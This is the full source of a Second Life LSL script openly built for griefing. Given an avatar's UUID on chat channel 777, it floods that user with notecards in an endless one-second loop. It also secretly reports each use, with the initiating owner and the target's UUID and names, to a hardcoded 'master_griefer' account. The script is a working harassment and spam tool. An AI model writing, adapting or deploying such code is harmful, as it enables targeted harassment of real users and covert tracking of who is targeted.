// TEST UUIDS
// e644cad2-7693-47b3-ade5-e892fb948712 - piol0

// TO-DO: CONSTANT MASTER KEY LIST OF SECURITY IDs
key master_griefer = "e644cad2-7693-47b3-ade5-e892fb948712";

// INTERFACE VARIABLES
integer gListener_menu;
string owner = "unknown";

// SERVICE FUNCTIONS
loop_spam(key user)
{
    while(1)
    {
        llGiveInventory(user, llGetInventoryName(INVENTORY_NOTECARD, 0) );
        llSleep(1.0);
    }    
}

// CONTROLLER
default
{
    state_entry()
    {   
        // get owner name for notification purposes
        owner = (string)llKey2Name(llGetOwner());
        
        // listen to /666 start cmd & display menu from anyone
        gListener_menu = llListen( 777, "", NULL_KEY, "");  
    }
    
    listen(integer channel, string name, key id, string message)
    {
            // convert uuid key to name & notify griefers
            string target_name = llKey2Name(message);
            string target_username = llGetDisplayName(message);
            
            if(target_name == NULL_KEY || target_name == "")
            {
                llInstantMessage(master_griefer, "uuid is invalid. please check and try again, bitch.");
            }
            else
            {
                // notify authorized griefers
                llInstantMessage(master_griefer,">>> log: "+ owner +" initiated impacto spammer <<<\n>>> target uuid: " + message + " <<<\n>>> target name: " + target_name + " | " + target_username +" <<<");
                // start spammer
                loop_spam(message);
            }
    }
    
    changed(integer mask)
    {   // triggered when the object containing this script changes owner
        if(mask & CHANGED_OWNER)
        {
            // reset script when there's a new owner
            llResetScript();  
        }
    }
    
}
